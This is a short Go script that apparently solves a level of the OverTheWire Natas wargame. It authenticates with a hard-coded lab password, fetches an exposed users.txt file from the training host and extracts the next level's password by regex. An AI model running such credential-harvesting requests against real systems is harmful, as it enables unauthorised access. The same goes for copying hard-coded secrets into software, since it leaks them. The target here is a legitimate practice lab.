package main

import (
    "fmt"
    "net/http"
    "time"
    "io/ioutil"
    "encoding/base64"
    "regexp"
)

func get_auth(username string, password string) (string){
    auth := username + ":" + password
    auth = base64.StdEncoding.EncodeToString([]byte(auth))
    auth = "Basic " + auth
    return auth
}

func get_url(subdomain string, domain string, path string) (string){
    url := "http://"+subdomain+"."+domain+path
    return url
}

func main(){
    const username = "natas2"
    const password = "ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi"
    const domain = "natas.labs.overthewire.org"
    const path = "/files/users.txt"
    const method = "GET"
    auth := get_auth(username,password)
    url := get_url(username,domain,path)
    client := &http.Client{
        Timeout: time.Second*10,
    }
    req,_ := http.NewRequest(method,url,nil)
    req.Header.Set("Authorization",auth)

    resp,_ := client.Do(req)
    body,_ := ioutil.ReadAll(resp.Body)
    // fmt.Print(string(body))
    re,_ := regexp.Compile(`natas3:(.*)`)
    pwd := re.FindStringSubmatch(string(body))
    fmt.Println(pwd[1])
}
